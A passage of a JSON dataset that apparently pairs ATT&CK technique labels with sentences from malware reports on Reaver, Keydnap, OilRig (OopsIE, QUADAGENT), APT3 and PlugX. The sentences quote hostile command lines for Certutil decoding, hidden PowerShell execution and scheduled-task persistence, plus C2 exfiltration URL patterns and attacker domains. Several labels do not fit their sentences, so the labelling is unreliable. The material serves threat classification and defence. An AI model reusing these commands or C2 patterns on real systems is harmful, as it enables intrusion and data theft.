            "Figure 26.\u00a0Communication with the C&C server after the exchange of OS packet info Meanwhile, the runHandle method of the main backdoor loop will call for the requestServer method with the following backdoor commands (each command has one byte long code and is extracted by Packet::getCommand):   Figure 27.\u00a0The getCommand method The figure below shows the example of two of several possible command codes"
        ]
    },
    "standard application layer protocol system network connections discovery-multi": {
        "technique_names": [
            "standard application layer protocol",
            "system network connections discovery"
        ],
        "sentances": [
            "Reaver.v1 has been observed delivering a payload that uses HTTP for network communication, while versions 2 and 3 use a payload that uses raw TCP connections for this communication"
        ]
    },
    "deobfuscate/decode files or information data staged-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "data staged"
        ],
        "sentances": [
            "This decrypted data is written to the following location:  %TEMP%\\WUpdate.~tmp  This \u2018WUpdate.~tmp\u2019 file is then copied to a filename of \u2018Applet.cpl\u2019, which is placed in the previously identified file path"
        ]
    },
    "registry run keys / startup folder query registry-multi": {
        "technique_names": [
            "registry run keys / startup folder",
            "query registry"
        ],
        "sentances": [
            "In the event this privilege was obtained, the common startup folder is queried by reading the following registry key:  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Common Startup  Alternatively, if the privilege was unable to be obtained, Reaver.v2 will obtain the user\u2019s startup folder by querying the following registry key:  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup  Reaver proceeds to write a shortcut file to \u2018%TEMP%\\~WUpdate.lnk\u2019"
        ]
    },
    "timestomp masquerading data staged-multi": {
        "technique_names": [
            "timestomp",
            "masquerading",
            "data staged"
        ],
        "sentances": [
            "This file is written to the following file path:  % TEMP%\\Update.~tmp  After the file is written, it is then copied to a filename of \u2019winhelp.cpl\u2019 in the directory that was initially chosen"
        ]
    },
    "data from local system file deletion file and directory discovery-multi": {
        "technique_names": [
            "data from local system",
            "file deletion",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "We have observed the following capabilities of this payload:  Get drive information Read files Write files Delete files Move files Spawn processes Create directories   Reaver TCP Payload The malicious CPL payload of Reaver has the following three exported functions:  ServiceMain CPlApplet DllEntryPoint  When the malware is initially loaded, DllEntryPoint will be called, which in turn will call a function that is responsible for decompressing a blob of data"
        ]
    },
    "service execution": [
        "An example of this decompressed configuration may be seen below:  Figure 2 Decompressed Reaver configuration This configuration contains multiple pieces of information, including the following:  Network port Sleep timer between network requests Remote Command and Control (C2) Service Name Service Description Service Display Name Hardcoded String",
        "Much like the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same method names as the original tool and follow the same call sequence:  Form1.Speed Form1.diomadnfagaghagh Form1.fjcsERIfjfiojsGHIsdifjksi Form1.gsgjIDJIGJIGJIGJIFDOSpl Form1.FJaioefgkaoeK  This chain of functions eventually loads a resource named \u2018GSrdofjksrgj\u2019, which the tool decrypts using the same algorithm and key as in the initial payload:byte[] array4 = new byte[] {     19,     129,     43,     37,     56,     65,     255,     75,     111,     19,     211,     120,     0,     49,     126,     248 };The decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the NanoCore remote administration tool",
        "The files we recovered indicate they do it by executing a script file, which uses the Sysinternals  psexec tool to move laterally by trying to copy it to every machine they can reach:"
    ],
    "modify registry": [
        "The following capabilities have been observed in this payload:  Get drive information Modify files Modify directories Modify registry Spawn process Terminate process Modify services Kill self   Ties to SunOrcal Reaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s",
        "",
        "The backdoor will modify the registry for the Windows Media Player to store its C&C configuration."
    ],
    "standard application layer protocol execution through api-multi": {
        "technique_names": [
            "standard application layer protocol",
            "execution through api"
        ],
        "sentances": [
            "We\u2019ve seen two onion addresses used in different samples:  g5wcesdfjzne7255.onion (Down) r2elajikcosf7zee.onion (Alive at time of writing)  The HTTP resource always starts with /api/osx/ and contains actions such as:  /api/osx/started to report the bot has just started /api/osx/keychain to exfiltrate the content of the keychain /api/osx/get_task?bot_id={botid}&version={version} to request a task (described below) /api/osx/cmd_executed to report a the output of a command that was executed /api/osx/task_complete?bot_id={botid}&task_id={taskid} to report a task was completed  HTTP POST content has two fields: bot_id and data"
        ]
    },
    "deobfuscate/decode files or information data encoding service execution-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "data encoding",
            "service execution"
        ],
        "sentances": [
            "Command IDDescription     0Uninstall Keydnap and quit   1Update the backdoor from a base64-encoded file   2Update the backdoor given a URL   3Decode and execute a base64-encoded file   4Decode and execute a base64-encoded Python script   5Download and execute a file from a URL   6Download and execute a Python script from a URL   7Execute a command and report the output back to the C&C server   8Request administrator privileges the next time the user runs an application   9Decode and execute, or stop, a base64-encoded file calledauthd_service    The last two commands stand out"
        ]
    },
    "screen capture exploitation for privilege escalation windows admin shares-multi": {
        "technique_names": [
            "screen capture",
            "exploitation for privilege escalation",
            "windows admin shares"
        ],
        "sentances": [
            "SHA-1FilenameFirst seen on VirusTotalBackdoor download URLDecoy description or URL     07cd177f5baf8c1bdbbae22f1e8f03f22dfdb148\"info_list.txt \"2016-05-09hxxp://dev.aneros.com/media/icloudsyncd\"Most Common Interview Questions\"   78ba1152ef3883e63f10c3a85cbf00f2bb305a6a\"screenshot_2016-06-28-01.jpg \"2016-06-28hxxp://freesafesoft.com/icloudsyncdBlackHat-TDS Panel screenshot   773a82343367b3d09965f6f09cc9887e7f8f01bf\"screenshot.jpg \"2016-05-07hxxp://dev.aneros.com/media/icloudsyncdFirefox 20 about screenshot   dfdb38f1e3ca88cfc8e9a2828599a8ce94eb958c\"CVdetails.doc \"2016-05-03hxxp://lovefromscratch.ca/wp-admin/css/icloudsyncdhxxp://lovefromscratch.ca/wp-admin/CVdetails.doc   2739170ed195ff1b9f00c44502a21b5613d08a58\"CVdetails.doc \"2016-05-03hxxp://lovefromscratch.ca/wp-admin/css/icloudsyncdhxxp://lovefromscratch.ca/wp-admin/CVdetails.doc   e9d4523d9116b3190f2068b1be10229e96f21729\"logo.jpg \"2016-06-02hxxp://dev.aneros.com/media/icloudsyncdsanelite logo   7472102922f91a78268430510eced1059eef1770\"screenshot_9324 2.jpg \"2016-06-28hxxp://freesafesoft.com/icloudsyncdSome C&C panel    Backdoor    SHA-1ESET Detection nameC&CVersion     a4bc56f5ddbe006c9a68422a7132ad782c1aeb7bOSX/Keydnap.Ahxxps://g5wcesdfjzne7255.onion.to1.3.1   abf99129e0682d2fa40c30a1a1ad9e0c701e14a4OSX/Keydnap.Ahxxps://r2elajikcosf7zee.onion.to1.3.5    Backdoor C&C servers  hxxps://g5wcesdfjzne7255.onion.to/ hxxps://r2elajikcosf7zee.onion.to/  Keydnap\u2019s IoCs are also available and updated on ESET\u2019s malware-ioc Github repository"
        ]
    },
    "masquerading data staged scripting-multi": {
        "technique_names": [
            "masquerading",
            "data staged",
            "scripting"
        ],
        "sentances": [
            "The v.vbs script drops four components (hUpdateCheckers.base, dUpdateCheckers.base, cUpdateCheckers.bat, and GoogleUpdateschecker.vbs) to the directory: C:\\ProgramData\\Windows\\Microsoft\\java\\ v.vbs uses CertUtil.exe, a legitimate Microsoft command-line program installed as part of Certificate Services, to decode the base64-encoded files hUpdateCheckers.base and dUpdateCheckers.base, and drop hUpdateCheckers.ps1 and dUpdateCheckers.ps1 to the staging directory"
        ]
    },
    "scheduled task execution through api scripting-multi": {
        "technique_names": [
            "scheduled task",
            "execution through api",
            "scripting"
        ],
        "sentances": [
            "Figure 4: Execution Workflow Section of v.vbs After successful execution of the steps mentioned in the Execution Workflow section, the Task Scheduler will launch GoogleUpdateschecker.vbs every minute, which in turn executes the dUpdateCheckers.ps1 and hUpdateCheckers.ps1 scripts"
        ]
    },
    "timestomp exfiltration over command and control channel remote file copy-multi": {
        "technique_names": [
            "timestomp",
            "exfiltration over command and control channel",
            "remote file copy"
        ],
        "sentances": [
            "Command  Description  Action  0  Server response string contains batch commands  Execute batch commands and send results back to server  1  Server response string is a file path  Check for file path and upload (PUT) the file to server  2  Server response string is a file path  Check for file path and download (GET) the file   Table 1: POWRUNER commands After successfully executing the command, POWRUNER sends the results back to the C2 server and stops execution"
        ]
    },
    "masquerading system network configuration discovery-multi": {
        "technique_names": [
            "masquerading",
            "system network configuration discovery"
        ],
        "sentances": [
            "Hardcoded domain \u201cmumbai-m[.]site\u201d  BONDUPDATER will attempt to resolve the resulting DGA domain and will take the following actions based on the IP address resolution:  Create a temporary file in %temp% location The file created will have the last two octets of the resolved IP addresses as its filename",
            "Malware samples and infrastructure for hxxp://stemtopx[.]com    Pattern Example   [domain]/work/docnew/[filename]   [domain]/administrator/help/[filename]   [domain]/xe/m/[filename]   [domain]/xe/s/[filename]   [domain]/images/yupsia/exe/[filename]   [domain]/images/yupsia/doc/[filename]    Table 2"
        ]
    },
    "standard application layer protocol masquerading web service exploitation for client execution-multi": {
        "technique_names": [
            "standard application layer protocol",
            "masquerading",
            "web service",
            "exploitation for client execution"
        ],
        "sentances": [
            "IOCs  Filename / Domain / IP Address  MD5 Hash or Description  CVE-2017-11882 exploit document  A0E6933F4E0497269620F44A083B2ED4  b.txt  9267D057C065EA7448ACA1511C6F29C7  v.txt/v.vbs  B2D13A336A3EB7BD27612BE7D4E334DF  dUpdateCheckers.base  4A7290A279E6F2329EDD0615178A11FF  hUpdateCheckers.base  841CE6475F271F86D0B5188E4F8BC6DB  cUpdateCheckers.bat  52CA9A7424B3CC34099AD218623A0979  dUpdateCheckers.ps1  BBDE33F5709CB1452AB941C08ACC775E  hUpdateCheckers.ps1  247B2A9FCBA6E9EC29ED818948939702  GoogleUpdateschecker.vbs  C87B0B711F60132235D7440ADD0360B0  hxxp://mumbai-m[.]site  POWRUNER C2  hxxp://dns-update[.]club  Malware Staging Server  CVE-2017-0199 exploit document  63D66D99E46FB93676A4F475A65566D8  94.23.172.164:80  Malware Staging Server  dupdatechecker.doc  D85818E82A6E64CA185EDFDDBA2D1B76  dupdatechecker.exe  C9F16F0BE8C77F0170B9B6CE876ED7FB  proxycheker[.]pro  C2  46.105.221.247  Has resolved mumbai-m[.]site & hpserver[.]online  148.251.55.110  Has resolved mumbai-m[.]site and dns-update[.]club  185.15.247.147  Has resolved dns-update[.]club  145.239.33.100  Has resolved dns-update[.]club  82.102.14.219  Has resolved ns2.dns-update[.]club & hpserver[.]online & anyportals[.]com  v7-hpserver.online.hta  E6AC6F18256C4DDE5BF06A9191562F82  dUpdateCheckers.base  3C63BFF9EC0A340E0727E5683466F435  hUpdateCheckers.base  EEB0FF0D8841C2EBE643FE328B6D9EF5  cUpdateCheckers.bat  FB464C365B94B03826E67EABE4BF9165  dUpdateCheckers.ps1  635ED85BFCAAB7208A8B5C730D3D0A8C  hUpdateCheckers.ps1  13B338C47C52DE3ED0B68E1CB7876AD2  googleupdateschecker.vbs  DBFEA6154D4F9D7209C1875B2D5D70D5  hpserver[.]online  C2  v7-anyportals.hta  EAF3448808481FB1FDBB675BC5EA24DE  dUpdateCheckers.base  42449DD79EA7D2B5B6482B6F0D493498  hUpdateCheckers.base  A3FCB4D23C3153DD42AC124B112F1BAE  dUpdateCheckers.ps1  EE1C482C41738AAA5964730DCBAB5DFF  hUpdateCheckers.ps1  E516C3A3247AF2F2323291A670086A8F  anyportals[.]com  C2"
        ]
    },
    "virtualization/sandbox evasion": [
        "The specific sandbox checks include:  Using WMI to check BIOS version (SMBIOSBIOSVERSION) for VBOX, bochs, qemu, virtualbox and vm",
        "Mouse Pointer Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_PointingDevice \u00a0 The Trojan will check the Caption, Description, HardwareType, InfSection, Manufacturer and Name fields in the results for the string VMware, Virtual, VBox, VM or Oracle",
        "Hard Disk Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_DiskDrive \u00a0 The Trojan will check the Caption and Model fields in the results for the strings Virtual, VMWare, VM, VBox or Oracle",
        "Motherboard Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_BaseBoard \u00a0 The Trojan will check the Manufacturer and Product fields in the results for the strings VMware, Virtual, VBox, VM or Oracle",
        "VMware DLL Check The Trojan checks to see if the files vmGuestLib.dll or vmbusres.dll exist in the system directory",
        "The OopsIE payload checks to see if the result of this query as more than 0 elements to determine if it is running on a virtual machine",
        "ShellTea utilizes a number of techniques to identify if it is running within a virtual environment or is being monitored."
    ],
    "audio capture standard application layer protocol exfiltration over command and control channel fallback channels-multi": {
        "technique_names": [
            "audio capture",
            "standard application layer protocol",
            "exfiltration over command and control channel",
            "fallback channels"
        ],
        "sentances": [
            "The payload has a function it calls early on that tests to see which DNS query types are able to successfully reach the C2 server.\u00a0 It iterates through a list of types and the first DNS type to receive a response from the C2 server will be used for all communications between the payload and the C2 server, which are in the following order (editor\u2019s note: AC is not a\u00a0 DNS record type but is a mode where the trojan will perform a request for an A record requiring ac as a subdomain):  A AAAA AC \u2013 (see note above) CNAME MX TXT SRV SOA  The payload uses the built-in Windows nslookup application with specific parameters and specially crafted subdomains to communicate with the C2"
        ]
    },
    "system owner/user discovery system network configuration discovery-multi": {
        "technique_names": [
            "system owner/user discovery",
            "system network configuration discovery"
        ],
        "sentances": [
            "The information gathered is added to a string in the following structure: <IP address>|<computer name>|<domain>|<username>|<isAdmin flag>|<hasGarbage flag from config>|<hasStartup flag from config>|<\u201chybrid\u201d mode flag from config>|<sleep interval from config>|<jitter value from config> The payload will base64 encode this string and use its DNS tunneling protocol to transmit the data to the C2"
        ]
    },
    "standard application layer protocol uncommonly used port fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "uncommonly used port",
            "fallback channels",
            "commonly used port"
        ],
        "sentances": [
            "We are not sure if this works, but the command name would suggest it is meant to take a screenshot   $command Runs a PowerShell command and sends the output to the C2   slp:\\d+ Sets the sleep interval between C2 beacons   $testmode Issues DNS queries of A, AAAA, AC, CNAME, MX, TXT, SRV and SOA types to the C2 servers attempting to determine which DNS query types were successful"
        ]
    },
    "windows management instrumentation virtualization/sandbox evasion-multi": {
        "technique_names": [
            "windows management instrumentation",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "First, we had not seen the CPU fan check used before, and upon testing the WMI query in a VMware Windows 7 virtual machine we saw no result, as seen in Figure 1  Figure 1 WMI query for the Win32_Fan class on a VM returning no statistics However, when we ran the same query in a physical system running Windows 7, we saw the contents of the Win32_Fan class, as seen in Figure 2"
        ]
    },
    "system owner/user discovery uncommonly used port fallback channels-multi": {
        "technique_names": [
            "system owner/user discovery",
            "uncommonly used port",
            "fallback channels",
            "commonly used port"
        ],
        "sentances": [
            "The C2 communications begins with a beacon to the following URL: hxxp://www.windowspatch[.]com/khc?<hex(STDOUT of whoami command)> If the C2 server wishes to send a command, it will respond to the beacon above by echoing the whoami command results sent by the Trojan to the C2 in the URL"
        ]
    },
    "disabling security tools obfuscated files or information-multi": {
        "technique_names": [
            "disabling security tools",
            "obfuscated files or information"
        ],
        "sentances": [
            "We found two obfuscation techniques applied to the script: the first one changing the representation of variables; the second one changing the representation of strings in the script",
            "Building a client    Build configuration Usage scenario Description     Debug configuration Testing The pre-defined Settings.cs will be used, so edit this file before compiling the client"
        ]
    },
    "scheduled task command-line interface scripting registry run keys / startup folder-multi": {
        "technique_names": [
            "scheduled task",
            "command-line interface",
            "scripting",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP% folder:       CreateObject(\"WScript.Shell\").Run \"\" & WScript.Arguments(0) & \"\", 0, False     The scheduled task will then run every five minutes, which provides persistent execution of the downloader script"
        ]
    },
    "masquerading query registry-multi": {
        "technique_names": [
            "masquerading",
            "query registry"
        ],
        "sentances": [
            "Office365DCOMCheck.ps1 and SystemDiskClean.ps1):       wscript.exe \"Office365DCOMCheck.vbs\" \\\"PowerShell.exe\u00a0\u00a0-ExecutionPolicy bypass -WindowStyle hidden -NoProfile '<current PowerShell script>'\u00a0\u00a0\\\"     After setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the same as the scheduled task (ex"
        ]
    },
    "standard application layer protocol exfiltration over command and control channel fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "exfiltration over command and control channel",
            "fallback channels"
        ],
        "sentances": [
            "The script will first attempt to communicate with the C2 server using HTTPS (HTTP if unsuccessful), which involves GET requests using the session ID within the request\u2019s cookie in the PHPSESSID field, as seen in the example GET request:       GET / HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246Host: www.rdppath[.]comCookie: PHPSESSID=<c2 provided session id>Connection: Keep-Alive     If the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling"
        ]
    },
    "custom cryptographic protocol deobfuscate/decode files or information data encoding-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "deobfuscate/decode files or information",
            "data encoding"
        ],
        "sentances": [
            "The data field within the message is a string of custom base64 encoded data that the malware decodes using the same custom base64 routine mentioned earlier and decrypts it using AES and the pre-shared key"
        ]
    },
    "standard application layer protocol custom cryptographic protocol exfiltration over alternative protocol fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "custom cryptographic protocol",
            "exfiltration over alternative protocol",
            "fallback channels"
        ],
        "sentances": [
            "If that fails, the payload will use DNS tunneling by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries: \u00a0 ns1.<random number between 100000 and 999999>.<c2 name> \u00a0 The payload will then split the message up into 60-byte chunks (only 1 in this case), which it will send to the C2 via DNS queries to resolve domains structured as: \u00a0 <encoded/encrypted data of message>.<same random number between 100000 and 999999>.<c2 name> \u00a0 The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as: \u00a0 ns2.<same random number between 100000 and 999999>.<c2 name> \u00a0 Package Comparison of the QUADAGENT Samples The bat2exe version (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63)has a batch script, PowerShell script, and associated file names embedded within several resources that it will decrypt using RC4 and various MD5 hashes for keys"
        ]
    },
    "deobfuscate/decode files or information file and directory discovery user execution-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "file and directory discovery",
            "user execution",
            "tor"
        ],
        "sentances": [
            "When macros are enabled and run, the macro within the Word document searches the sections of the document to get the contents of the header using the following piece of code:       Set rng = ActiveDocument.Sections(intSection).Headers(1).Range     The code above obtains the contents of the header, which the macro will write to a file at C:\\programdata\\Office365DCOMCheck.ps1"
        ]
    },
    "deobfuscate/decode files or information masquerading-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "masquerading"
        ],
        "sentances": [
            "The SecurityAssist task is responsible for running the following command line command that uses the Certutil application to decode the base64 encoded data in Base.txt and saves the decoded data to the file %PROGRAMDATA%\\IntelSecurityAssistManager.exe:cmd.exe /c Certutil -decode %appdata%\\Base.txt %programdata%\\IntelSecurityAssistManager.exe & SchTasks /Delete /F /TN SecurityAssist The macro also creates a second scheduled task named Conhost that waits two minutes and runs a VBScript %APPDATA%\\chkSrv.vbs"
        ]
    },
    "scheduled task file deletion-multi": {
        "technique_names": [
            "scheduled task",
            "file deletion"
        ],
        "sentances": [
            "The macro saves the chkSrv.vbs script to the system, which is responsible for running the IntelSecurityAssistManager.exe payload (OopsIE Trojan) and cleaning up the installation by deleting the two scheduled tasks, the Base.txt file, the ThreeDollars document, and the chkSrv.vbs script"
        ]
    },
    "software packing obfuscated files or information-multi": {
        "technique_names": [
            "software packing",
            "obfuscated files or information"
        ],
        "sentances": [
            "OopsIE Trojan Analysis The OopsIE Trojan delivered in these attacks is packed with SmartAssembly and further obfuscated with ConfuserEx v1.0.0",
            "The resulting Interop.SHDocVw .NET assembly is packed with SmartAssembly and further obfuscated using Confuser v1.9.0.0"
        ]
    },
    "standard application layer protocol scheduled task-multi": {
        "technique_names": [
            "standard application layer protocol",
            "scheduled task"
        ],
        "sentances": [
            "Finally, the Trojan creates a scheduled task to run itself every three minutes by running the following command on the command prompt after replacing the %path% string with the path to the srvResesponded.vbs VBScript:SchTasks /Create /SC MINUTE /MO 3 /TN \u201cInetlSecurityAssistManager\u201d /TR \u201cwscript %path%\u201d /f The Trojan uses HTTP to communicate with its C2 server, specifically using the InternetExplorer application object within an embedded Microsoft .NET Framework assembly called Interop.SHDocVw"
        ]
    },
    "standard application layer protocol custom cryptographic protocol web service exfiltration over command and control channel fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "custom cryptographic protocol",
            "web service",
            "exfiltration over command and control channel",
            "fallback channels"
        ],
        "sentances": [
            "The OopsIE Trojan is configured to use a C2 server hosted at:www.msoffice365cdn[.]com The Trojan will construct specific URLs to communicate with the C2 server and parses the C2 server\u2019s response looking for content within the tags <pre> and </pre>"
        ]
    },
    "standard application layer protocol custom cryptographic protocol exfiltration over command and control channel uncommonly used port data encoding fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "custom cryptographic protocol",
            "exfiltration over command and control channel",
            "uncommonly used port",
            "data encoding",
            "fallback channels",
            "commonly used port"
        ],
        "sentances": [
            "If the C2 server provides the appropriate echoed data in the response, the Trojan attempts to determine what\u00a0 commands the C2 wishes to run by issuing a request to the following URL:http://<c2 domain>/what?<hex(Environment.UserName/Environment.MachineName)> After issuing the what command, the Trojan will parse the C2\u2019s response for the string Oops, which the Trojan will treat as the C2 making a mistake and will exit"
        ]
    },
    "timestomp system network configuration discovery command-line interface remote file copy-multi": {
        "technique_names": [
            "timestomp",
            "system network configuration discovery",
            "command-line interface",
            "remote file copy"
        ],
        "sentances": [
            "Otherwise, the Server will respond with a command followed by a set of parameters, split up by the delimiter <>:[command]<>[parameters for command in hexadecimal format] The available commands are: Command Description 1 Run command 2 Upload a file 3 Download a specified file \u00a0 The parameters for each command are issued in hexadecimal format"
        ]
    },
    "timestomp file deletion remote file copy-multi": {
        "technique_names": [
            "timestomp",
            "file deletion",
            "remote file copy"
        ],
        "sentances": [
            "If the file does not exist, the Trojan will send the C2 server a message < File Not Found > by sending the following URL:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(\u201c< File Not Found >\u201d)> If the file exists, the Trojan will read the contents of the specified file and compresses the contents using the GZipStream class"
        ]
    },
    "custom cryptographic protocol file deletion data staged exfiltration over command and control channel exfiltration over alternative protocol data encrypted-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "file deletion",
            "data staged",
            "exfiltration over command and control channel",
            "exfiltration over alternative protocol",
            "data encrypted"
        ],
        "sentances": [
            "The Trojan then gets the hexadecimal values of the compressed data and will replace the following hexadecimal values on each line with ASCII characters to further compressed the data: \u00a0 String of hexadecimal values Character replacement 000000 z 00000 x 0000 y 000 g 00 w 01 t \u00a0 The Trojan then writes 1500 bytes of the hexadecimal formatted data, one per line to a temporary file in the SpecialFolder.CommonApplicationData folder named as:<day><hour><second><millisecond>.tmp The Trojan will then read each line from this temporary file and send them to the C2 server by issuing requests to a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZ<hex(1500 characters of hexadecimal formatted file contents)> Once all of the lines of hexadecimal formatted data in the temporary file are sent to the C2 server, the Trojan will send a request to the C2 server to notify the data has been successfully transmitted via a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZFinish \u00a0Overlaps with Previous OilRig Group Attacks Since May 2016, we have continued to monitor and uncover various attacks and tools associated with the OilRig group"
        ]
    },
    "file and directory discovery pass the hash-multi": {
        "technique_names": [
            "file and directory discovery",
            "pass the hash",
            "tor"
        ],
        "sentances": [
            "These files have the following metadata: doc.exe (x86): MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 492a839a3bf9c61b7065589a18c5aa8d Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 12288 bytes Import Hash\u00a0\u00a0 9342d18e7d315117f23db7553d59a9d1 doc.exe (x64): MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 744a17a3bc6dbd535f568ef1e87d8b9a Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 13824 bytes Compile Time\u00a0 2014-11-19 08:25:45Z Import Hash\u00a0\u00a0 2fab77a3ff40e4f6d9b5b7e813c618e4 test.exe: MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 5c08957f05377004376e6a622406f9aa Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 11264 bytes Compile Time\u00a0 2014-11-18 10:49:23Z Import Hash\u00a0\u00a0 f34d5f2d4577ed6d9ceec516c1f5a744 These payload files also have interesting PDB debug strings"
        ]
    },
    "system owner/user discovery masquerading account discovery user execution-multi": {
        "technique_names": [
            "system owner/user discovery",
            "masquerading",
            "account discovery",
            "user execution"
        ],
        "sentances": [
            "install.exe: \u00a0\u00a0\u00a0 c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\MShell\\Release\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \\MShell.pdb doc.exe: \u00a0\u00a0\u00a0 c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\4113\\Release\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \\4113.pdb test.exe: \u00a0\u00a0\u00a0 C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\MyRat\\Client\\Client\u00a0 \u00a0\u00a0\u00a0 \\obj\\x86\\Release\\Client.pdb The most interesting PDB string is the \u201c4113.pdb,\u201d which appears to reference CVE-2014-4113",
            "The file is saved to: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad.exe  00 00 04  Content after command ID is written to: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad2.exe  00 00 05  The files notepad1.exe and notepad2.exe are concatenated together and written to C:\\Users\\[Username]\\AppData\\Local\\Temp\\newnotepad.exe and executed  00 00 06  The contents of the following file is sent to the server: C:\\Users\\[Username]\\AppData\\Local\\Temp\\note.txt  00 00 07  The string following the command ID is executed using \"cmd /C\" and results are sent to server   Links to APT3 On October 28, we observed APT3 sending out spearphishing messages containing a compressed executable attachment"
        ]
    },
    "system owner/user discovery user execution-multi": {
        "technique_names": [
            "system owner/user discovery",
            "user execution"
        ],
        "sentances": [
            "The following commands are supported by the malware:  Command ID  Description  00 00 00  Content after command ID is written to: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad1.exe  00 00 01  Deletes the files: C:\\Users\\[Username]\\AppData\\Local\\Temp\\notepad.exe C:\\Users\\[Username]\\AppData\\Local\\Temp\\newnotepad.exe  00 00 02  Malware exits  00 00 03  Malware downloads the URL that follows the command ID"
        ]
    },
    "system network configuration discovery exploitation for privilege escalation-multi": {
        "technique_names": [
            "system network configuration discovery",
            "exploitation for privilege escalation"
        ],
        "sentances": [
            "DOMAIN  FIRST SEEN  LAST SEEN  IP ADDRESS  securitywap.com  2014-11-17  2014-11-20  192.184.60.229  www.securitywap.com  2014-11-17  2014-11-20  192.184.60.229   In addition, the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173",
            "This IP has hosted other domains used by APT3 in past campaigns:  DOMAIN  FIRST SEEN  LAST SEEN  IP ADDRESS  join.playboysplus[.]com  2014-11-21  2014-11-21  104.151.248.173  walterclean[.]com  2014-11-18  2014-11-20  104.151.248.173  www.walterclean[.]com  2014-11-18  2014-11-20  104.151.248.173   As we discussed in our previous blog detailing\u00a0previous APT3 activity, the walterclean[.]com served as a Plugx/Kaba command and control server"
        ]
    },
    "spearphishing link drive-by compromise-multi": {
        "technique_names": [
            "spearphishing link",
            "drive-by compromise",
            "arp"
        ],
        "sentances": [
            "Victims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious attachments"
        ]
    },
    "process discovery registry run keys / startup folder-multi": {
        "technique_names": [
            "process discovery",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "When executed, the .NET Framework wrapper will first check if VMware tools is running in background, this is done via a simple process check, searching for any process named \u201cvmtoolsd.\u201d Provided there are no matching processes running, the malware continues execution, creating a registry entry with the name \u2018MSASCuiLTasks\u2019 in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce for persistence"
        ]
    },
    "system information discovery deobfuscate/decode files or information obfuscated files or information-multi": {
        "technique_names": [
            "system information discovery",
            "deobfuscate/decode files or information",
            "obfuscated files or information"
        ],
        "sentances": [
            "Encrypted Configuration in shellcode The configuration information for the malware, including the C2 information are encrypted in the first shellcode blob and are passed as an argument to the DllMain function of the main PlugX DLL"
        ]
    },
    "masquerading process injection-multi": {
        "technique_names": [
            "masquerading",
            "process injection"
        ],
        "sentances": [
            "For example, we can see it will inject itself to one these three processes:  %ProgramFiles(x86)%\\Sophos\\AutoUpdate\\ALUpdate.exe %ProgramFiles(x86)%\\Common Files\\Java\\Java Update\\jusched.exe %ProgramFiles(x86)%\\Common Files\\Adobe\\ARM\\1.0\\armsvc.exe  The attempt to inject itself into a process belonging to antivirus product suite is particularly bold"
        ]
    },
    "spearphishing link standard application layer protocol web service-multi": {
        "technique_names": [
            "spearphishing link",
            "standard application layer protocol",
            "web service",
            "arp"
        ],
        "sentances": [
